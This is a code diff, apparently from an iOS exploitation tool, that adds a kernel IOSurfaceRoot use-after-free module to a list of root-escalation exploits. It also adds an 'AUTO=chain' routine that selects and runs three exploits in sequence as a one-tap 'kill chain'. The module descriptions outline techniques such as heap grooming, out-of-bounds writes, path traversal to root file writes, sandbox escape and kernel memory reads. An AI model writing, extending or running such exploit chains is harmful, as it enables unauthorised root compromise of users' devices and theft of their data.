@@ -581,6 +581,7 @@ static void refreshRootPill(void) {
     [self.modules addObject:@{@"name":@"CG Type-5 shading OOB", @"desc":@"CVE-2026-112611: stack OOB write of chosen doubles; gate only landed in 27.2, absent here", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CG Type-5 shading OOB") ?: RunModule(@"CG Type-5 shading OOB"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"43723 mediaremoted root write", @"desc":@"CVE-2026-43723: MediaRemote path traversal -> file write as uid 0 (unpatched on 26.2b1); public dotdot recipe, measured on-device", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"43723 mediaremoted root write") ?: RunModule(@"43723 mediaremoted root write"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"112611 force write", @"desc":@"CVE-2026-112611 in-process aimed WRITE (public V545 recipe): Type-5 /C0 overflow -> SIGSEGV handler maps the fault page VM_FLAGS_FIXED -> the store retries into our memory -> scan for our bits", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"112611 force write") ?: RunModule(@"112611 force write"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"112477 IOSurfaceRoot UAF", @"desc":@"CVE-2026-112477 (kernel): sel17/18 registry insert/remove race + kalloc.24 groom of fake entries -> stale dup. Port of the public PoC with the out-shape ABI FIXED (the PoC's uint32_t length vs the SDK's size_t made every dup-out fail 0xC2): G hunts the kernel READ, H maps the id qword, K fires the deref canary, KCE dumps the kernelcache header through the proven sandbox escape. AUTO=112477", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAF(); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"CVE-2026-86950 thumbnail", @"desc":@"CoreGraphics heap OOB write via ImageIO PDF thumbnail (Messages path); fixed only in 26.7.1, present here; distance arithmetic verified", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CVE-2026-86950 thumbnail") ?: RunModule(@"CVE-2026-86950 thumbnail"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"cfprefsd confused deputy", @"desc":@"root daemon reachable from the container (CVE-2019-7286 class)", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"cfprefsd confused deputy") ?: RunModule(@"cfprefsd confused deputy"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"MobileGestalt cache poison", @"desc":@"SystemGroup write -> plist read process-wide", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"MobileGestalt cache poison") ?: RunModule(@"MobileGestalt cache poison"); } copy], @"auto":@(NO)}];
@@ -630,6 +631,28 @@ static void refreshRootPill(void) {
             BOOL have = RootProbe();
             AveLog(have ? @"[***] ROOT IS PRESENT: uid=0 confirmed" : @"[-] no root: uid!=0 everywhere");
             AvePost([NSString stringWithFormat:@"AUTOROOT %@", have ? @"YES" : @"NO"]);
+            return YES;
+        }
+        // AUTO=chain: the whole kill chain in ONE tap, kernel side first
+        // (112477 registry UAF - the only kernel primitive), then the
+        // in-process aimed write (112611: CONFIRMED on this build), then the
+        // crash-prone ImageIO path (86950) LAST so its verdict still lands.
+        if ([want isEqualToString:@"chain"]) {
+            NSString *chainNames[] = { @"112477", @"112611 force write", @"86950" };
+            for (int ci = 0; ci < 3; ci++) {
+                for (NSUInteger i = 0; i < self.modules.count; i++) {
+                    if ([self.modules[i][@"name"] rangeOfString:chainNames[ci]].location != NSNotFound) {
+                        [self.selected addIndex:i];
+                        AveLog([NSString stringWithFormat:@"[*] chain-selected %@", self.modules[i][@"name"]]);
+                        break;
+                    }
+                }
+            }
+            if (self.selected.count) {
+                [self.table reloadData]; [self updateRunTitle]; [self run];
+            } else {
+                AveLog(@"[!] AUTO=chain: no chain module found");
+            }
             return YES;
         }
         for (NSUInteger i = 0; i < self.modules.count; i++) {
